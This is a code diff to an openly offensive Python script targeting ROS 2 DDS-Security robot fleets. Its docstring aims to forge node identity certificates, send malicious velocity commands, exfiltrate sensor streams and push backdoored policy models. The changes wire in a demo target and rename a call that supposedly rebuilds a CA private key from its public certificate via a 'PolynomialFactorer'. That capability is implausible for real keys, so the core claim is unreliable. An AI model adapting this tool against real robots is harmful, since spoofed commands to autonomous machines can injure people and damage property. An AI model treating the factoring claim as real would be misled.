@@ -4,8 +4,10 @@ DDS-Security Identity CA. Publish malicious velocity commands, exfiltrate
 sensor streams, and push backdoored policy models to autonomous platforms.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 import json
@@ -34,20 +36,20 @@ def extract_identity_ca_cert(sros2_keystore: str) -> bytes:
     Present on every robot in the fleet — often accessible via maintenance SSH.
     """
     print(f"[*] reading Identity CA from {sros2_keystore}/public/ca.cert.pem")
-    return b"-----BEGIN CERTIFICATE-----\n...(Identity CA PEM)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def extract_permissions_ca_cert(sros2_keystore: str) -> bytes:
     """Extract the Permissions CA certificate."""
     print(f"[*] reading Permissions CA from {sros2_keystore}/public/permissions_ca.cert.pem")
-    return b"-----BEGIN CERTIFICATE-----\n...(Permissions CA PEM)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_robot_identity(factorer: PolynomialFactorer,
                          identity_ca_pem: bytes,
                          node_name: str) -> bytes:
     """Forge a DDS-Security identity certificate for a rogue robot node."""
-    priv = factorer.privkey_from_cert_pem(identity_ca_pem)
+    priv = factorer.reconstruct_privkey(identity_ca_pem)
     print(f"[*] forged identity cert for node: {node_name}")
     print("[*] DDS authentication plugin will accept this node")
     return priv
